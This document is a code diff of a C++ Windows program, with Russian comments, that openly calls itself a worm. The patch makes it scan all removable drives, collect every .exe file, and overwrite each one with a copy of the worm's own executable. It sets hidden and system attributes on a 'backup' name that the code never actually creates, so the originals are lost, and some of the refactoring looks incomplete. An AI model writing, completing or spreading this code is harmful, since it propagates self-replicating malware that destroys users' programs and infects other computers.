@@ -10,6 +10,8 @@
 #include <codecvt>
 #include <Lmcons.h>
 #include <shlobj.h>
+#include <cstdlib> // для wstring?
+#include <fstream>  // для работы generate_loader_source
 
 using namespace std;
 namespace fs = std::filesystem;
@@ -22,6 +24,7 @@ void init_locale();
 // Генератор случайных чисел
 wstring generate_unique_suffix();
 vector<wstring> get_removable_volume_paths(); // поиск всех съемных носителей
+void filter_only_exe(vector<fs::path>& files); // фильтруем из всех файлов, только exe
 
 
 void worm_was_started();
@@ -38,6 +41,7 @@ private:
 	vector <wstring> list_dir;
 	vector <fs::path> file_to_copy;
 	int iteration;
+	vector <fs::path> exe_on_the_flash_drive;
 
 
 
@@ -80,7 +84,7 @@ public:
 	
 
 
-	void search_list_dir(const wstring& path_to_dir, vector<wstring> &list_dir_tmp) { // рекурсивный поиск всех папок по адрессу и внутри и копирование в выбранный вектор
+	void search_list_dir(const wstring& path_to_dir, vector<wstring> &list_dir_tmp) { // рекурсивный поиск всех подпапок по адрессу и внутри и копирование в выбранный вектор
 		error_code ec;
 
 		fs::directory_iterator it(path_to_dir, ec);
@@ -96,7 +100,7 @@ public:
 				search_list_dir(dir_path, list_dir_tmp);  // рекурсия
 			}
 		}
-
+		list_dir_tmp.push_back(path_to_dir);
 		
 	}
 
@@ -237,6 +241,8 @@ public:
 	
 	// Обработка съемных носителей
 
+
+
 	void process_all_removable_disks() { // проходимся по всем съемным носителям
 		vector<wstring> removable = get_removable_volume_paths();
 
@@ -246,24 +252,34 @@ public:
 			data_list.clear();
 			search_list_dir(root, data_list); // Рекурсивно собрать все директории
 
-			collect_visible_files(data_list, file_to_copy); // Собираем все видимые файлы
-			filter_only_exe(file_to_copy); // Фильтруем только .exe
+			collect_visible_files(data_list, exe_on_the_flash_drive); // Собираем все видимые файлы
+			filter_only_exe(exe_on_the_flash_drive); // Фильтруем только .exe
 
-			for (const auto& exe_path : file_to_copy) {
-				//try_replace_exe_with_worm(exe_path);
+			for (const auto& exe_path : exe_on_the_flash_drive) {
+				hide_and_replace_exe(exe_path, get_own_path());
 			}
 		}
 	}
 
-	void filter_only_exe(vector<fs::path>& files) { // фильтруем из всех файлов, только exe
-		vector<fs::path> filtered;
-		for (const auto& file : files) {
-			if (file.extension() == L".exe") {
-				filtered.push_back(file);
-			}
-		}
-		files = filtered;
+	void hide_and_replace_exe(const fs::path& target_exe, const std::wstring& worm_path) { // подмена exe на червя
+		
+		// Сброс всех атрибутов (включая HIDDEN, SYSTEM, READONLY)
+		SetFileAttributesW(target_exe.c_str(), FILE_ATTRIBUTE_NORMAL);
+		
+		// Генерация уникального имени для оригинала
+		std::wstring unique_suffix = generate_unique_suffix();
+		fs::path backup = target_exe;
+		backup.replace_filename(target_exe.stem().wstring() + L"_" + unique_suffix + target_exe.extension().wstring());
+
+		// Копирование червя под оригинальным именем
+		CopyFileW(worm_path.c_str(), target_exe.c_str(), FALSE);			
+
+		// Установка скрытых атрибутов для оригинала
+		SetFileAttributesW(backup.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+		
 	}
+
+
 
 };
 
